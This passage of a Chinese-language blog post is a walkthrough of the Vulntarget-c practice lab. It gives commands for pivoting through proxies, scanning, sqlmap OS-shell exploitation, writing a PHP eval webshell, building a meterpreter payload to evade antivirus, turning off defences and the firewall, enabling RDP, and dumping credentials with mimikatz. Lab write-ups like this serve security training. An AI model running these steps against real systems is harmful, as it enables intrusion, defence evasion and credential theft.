+<p><strong>添加路由</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> autoroute -p 10.0.20.0/24<br><span class="hljs-built_in">run</span> post/multi/manage/autoroute<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/dNISY9JXoi8zZgL.png" srcset="/img/loading.gif" lazyload alt="image-20220725203200989"></p>
+<p><strong>代理转发</strong></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/server/socks_proxy<br><span class="hljs-keyword">set</span> svrhost 127.0.0.1<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>内网端口扫描</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">useauxiliary/scanner/portscan/tcp<br><span class="hljs-built_in">set</span><span class="hljs-built_in"> port </span>10.0.20.0/24<br><span class="hljs-built_in">set</span> threads 100<br>run<br></code></pre></td></tr></table></figure>
+
+<p>nmap扫描部分端口，节约时间</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> nmap -sT -p22,<span class="hljs-number">23</span>,<span class="hljs-number">80</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">8080</span> -Pn <span class="hljs-number">10.0.20.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p>发现10.0.20.100主机存货扫描端口信息。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> proxychains nmap -sT -Pn -p- <span class="hljs-number">10.0.20.100</span><br></code></pre></td></tr></table></figure>
+
+<p>扫描出80和443端口。</p>
+<p>由于msf的socks代理稳定性不大好，这里换用frp做代理</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 受害者</span><br><span class="hljs-comment"># vim ./frpc.ini</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">server_addr</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">56.105</span> <span class="hljs-comment">#服务端的IP地址</span><br><span class="hljs-attr">server_port</span> = <span class="hljs-number">7000</span>           <span class="hljs-comment">#服务端的端口</span><br><br><span class="hljs-section">[socks_proxy]</span><br><span class="hljs-attr">type</span> = tcp<br><span class="hljs-attr">remote_port</span> = <span class="hljs-number">1080</span>       <span class="hljs-comment">#socks端口</span><br><span class="hljs-attr">plugin</span> = socks5<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 攻击者</span><br><span class="hljs-comment"># vim ./frpc.ini</span><br><span class="hljs-section">[common]</span><br><span class="hljs-attr">bind_ip</span> = <span class="hljs-number">192.168</span>.<span class="hljs-number">56.105</span>   <span class="hljs-comment">#kali IP，为与客户端绑定的进行通讯的地址</span><br><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7000</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frpc -c ./frpc.ini<br>./frpc -c ./frpc.ini<br></code></pre></td></tr></table></figure>
+
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>发现登录框，<strong>SQL注入检查</strong></p>
+<p><img src="https://s2.loli.net/2022/08/08/7kPYn9uBUVgbeLx.png" srcset="/img/loading.gif" lazyload alt="image-20220726103105129"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap -u <span class="hljs-string">&#x27;http://10.0.20.100:80/classes/Login.php?f=login&#x27;</span> <span class="hljs-attr">--data</span>=<span class="hljs-string">&#x27;username=admin&amp;password=123&#x27;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&#x27;PHPSESSID=kp9v9tia4egsgvjk0vf0bhm346&#x27;</span> <span class="hljs-attr">--proxy</span>=<span class="hljs-string">&quot;socks5://127.0.0.1:1080&quot;</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/NSn27boQCFVDOuH.png" srcset="/img/loading.gif" lazyload alt="image-20220726122254975"></p>
+<p>NO!</p>
+<p><strong>暴力破解检查</strong></p>
+<p>爆出密码admin123，直接登录。</p>
+<p><img src="https://img-blog.csdnimg.cn/bad15ab3ce7548beaa7b4252a8031368.png" srcset="/img/loading.gif" lazyload alt="image-20220726124015630"></p>
+<p>经测试，在server list中发现可以sql注入漏洞。</p>
+<p><img src="https://s2.loli.net/2022/08/08/jtpyoZEBV54SNf8.png" srcset="/img/loading.gif" lazyload alt="image-20220726123851317"></p>
+<p>sqlmap一把梭</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -r post.txt <span class="hljs-params">--batch</span> <span class="hljs-params">--os-shell</span> <span class="hljs-params">--proxy=</span><span class="hljs-string">&quot;socks5://127.0.0.1:1080&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/Cye48wKkq5uWvZh.png" srcset="/img/loading.gif" lazyload alt="image-20220726124720571"></p>
+<p><code>whoami</code>显示是windows主机，并且有系统权限，但还省得提权了。</p>
+<p><img src="https://s2.loli.net/2022/08/08/V8z2BNb6HGIqcPM.png" srcset="/img/loading.gif" lazyload alt="image-20220726124937738"></p>
+<p>一句话木马写入，蚁剑连接。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> ^&lt;^?php <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>&quot;</span>;<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;test&#x27;</span>] = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$b</span>[<span class="hljs-string">&#x27;test&#x27;</span>].<span class="hljs-string">&quot;<span class="hljs-variable">$a</span>&quot;</span>);<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;error&quot;</span>;?^&gt;^ &gt; shell.php<br></code></pre></td></tr></table></figure>
+
+<p><strong>查看杀软</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tasklist /scv<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/e8mZiqwTztoQf9D.png" srcset="/img/loading.gif" lazyload alt="image-20220726152758796"></p>
+<p>将结果放到网站进行杀软查杀</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>payloads.net<span class="hljs-regexp">/kill_software/</span><br></code></pre></td></tr></table></figure>
+
+<p>发现存在微软Windows Defender。</p>
+<p><img src="https://s2.loli.net/2022/08/08/wxyAqHIlYmaXE9f.png" srcset="/img/loading.gif" lazyload alt="image-20220726152735389"></p>
+<p>免杀上线。</p>
+<p>生成源代码木马</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/bind_tcp <span class="hljs-attribute">lhost</span>=10.0.20.100 <span class="hljs-attribute">lport</span>=6666 -f hex -o 6666.hex<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/fvbup9sGrxi63kg.png" srcset="/img/loading.gif" lazyload alt="image-20220726162245627"></p>
+<p>上传gsl64.exe 和6666.hex，上线</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">gsl64.exe -f <span class="hljs-number">6666.</span><span class="hljs-built_in">hex</span> -<span class="hljs-built_in">hex</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/2vn8FLCZStwRWkV.png" srcset="/img/loading.gif" lazyload alt="image-20220803122234640"></p>
+<p>成功进入。</p>
+<h3 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h3><p><strong>关闭杀软</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">meterpreter&gt; <span class="hljs-built_in">run</span> killav<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/1e9rhHfMWujGS7U.png" srcset="/img/loading.gif" lazyload alt="image-20220803124816181"></p>
+<p><strong>关闭防火墙</strong></p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br>netsh firewall <span class="hljs-built_in">set</span> opmode mode=disable<br>netsh advfirewall show allprofiles<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/U9KnVyY5vaxHCWu.png" srcset="/img/loading.gif" lazyload alt="image-20220803124913510"></p>
+<p><strong>开启3389</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">reg <span class="hljs-built_in">add</span> <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /t REG_DWORD /v portnumber /d 3389 /f<br><br>wmic RDTOGGLE WHERE <span class="hljs-attribute">ServerName</span>=<span class="hljs-string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1<br><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br><br>reg <span class="hljs-built_in">add</span> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0 /f<br><br>netstat -ano | findstr <span class="hljs-string">&quot;3389&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/F1ObpWyxCmjBwhq.png" srcset="/img/loading.gif" lazyload alt="image-20220803125034919"></p>
+<p><strong>mimikatz获取密码</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span><br><span class="hljs-attribute">hashdump</span><br><span class="hljs-attribute">creds_all</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/08/08/aiS36JVhkFgsPRH.png" srcset="/img/loading.gif" lazyload alt="image-20220803132038928"></p>
+<p>没有读取到密码，试着接一下hash。</p>
+<p><img src="https://s2.loli.net/2022/08/08/3V4Z7NDq6EHKW2b.png" srcset="/img/loading.gif" lazyload alt="image-20220803132237159"></p>
+<p>得到密码Admin#123，远程登陆成功。</p>
+<p><img src="https://s2.loli.net/2022/08/08/puZdYLVyaj3JRz1.png" srcset="/img/loading.gif" lazyload alt="image-20220803132826488"></p>
+<p>远程主机发现网络控制工具MobaXterm，输入本机密码，成功进入。</p>
+<p><img src="https://s2.loli.net/2022/08/08/fd8koxcbBSQyqRM.png" srcset="/img/loading.gif" lazyload alt="image-20220803132933650"></p>
+<h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><p>MobaXterm查看密码：</p>
+<p><img src="https://s2.loli.net/2022/08/08/EJmu3Xi9Ul8PxzV.png" srcset="/img/loading.gif" lazyload alt="image-20220803133620323"></p>
+<p><img src="https://s2.loli.net/2022/08/08/cMNOGD8zy123VmJ.png" srcset="/img/loading.gif" lazyload alt="image-20220803133552200"></p>
+<p><img src="https://s2.loli.net/2022/08/08/efrZtD2d5SJPUbh.png" srcset="/img/loading.gif" lazyload alt="image-20220803133527277"></p>
+<p>msf做代理，远程登陆主机，得到flag。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/" class="print-no-link">#靶场</a>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Vulntarget靶场渗透之Vulntarget-c</div>
+      <div>https://genioco.github.io/2023/08/09/hacking/Vulntarget靶场渗透之Vulntarget-c/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>BadWolf</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/09/09/hacking/Vulntarget%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8BVulntarget-d/" title="Vulntarget靶场渗透之Vulntarget-d">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Vulntarget靶场渗透之Vulntarget-d</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/01/Guide/ProxmoxVE%E6%95%99%E7%A8%8B/" title="ProxmoxVE教程">
+                        <span class="hidden-mobile">ProxmoxVE教程</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"genIoco/genIoco.github.io","repo-id":"R_kgDOMU-44w","category":"General","category-id":"DIC_kwDOMU-4484CgxC5","theme-light":"light","theme-dark":"dark","mapping":"og:title","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicRibbon.js"></script>
+<script src="/js/leaves.js"></script>
+<script src="/js/containsWord.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
